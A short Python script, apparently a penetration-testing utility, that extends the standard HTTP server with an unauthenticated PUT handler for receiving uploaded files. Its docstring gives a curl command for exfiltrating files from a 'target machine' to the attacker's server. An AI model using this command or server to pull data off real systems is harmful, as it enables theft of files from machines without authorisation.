#!/usr/bin/python3
'''
httpserver.py

Fully-functional HTTP Server with PUT support.

Adapted from: https://github.com/w0lfram1te/extended-http-server/tree/main

For data exfil on target machine run: $ curl --upload-file FILENAME http://SERVER/dir

Pete Toth
21 December 2023
'''

import http.server
import argparse

class FullFunctionHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, directory=None, **kwargs):
        super().__init__(*args, **kwargs)

    # serve put requests
    def do_PUT(self):
        try:
            path = self.translate_path(self.path)
            length = int(self.headers["Content-length"])
            with open(path, 'wb') as f:
                f.write(self.rfile.read(length))
            self.send_response(201, "Created")
            self.end_headers()
        except:
            self.send_response(500, "Internal Server error")
            self.end_headers()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='HTTP Server with PUT support')
    parser.add_argument('port', metavar='port', type=int, nargs='?', default=8000, help="listening port")
    parser.add_argument('-b','--bind', action='store', dest='bind', default='0.0.0.0', help="bind address")
    parser.add_argument('-p', '--port', action='store', dest='port', default=8000, help="listening port")
    args = parser.parse_args()

    print("[*] Running modified HTTP server...")
    http.server.test(HandlerClass=FullFunctionHTTPRequestHandler, port=args.port, bind=args.bind)
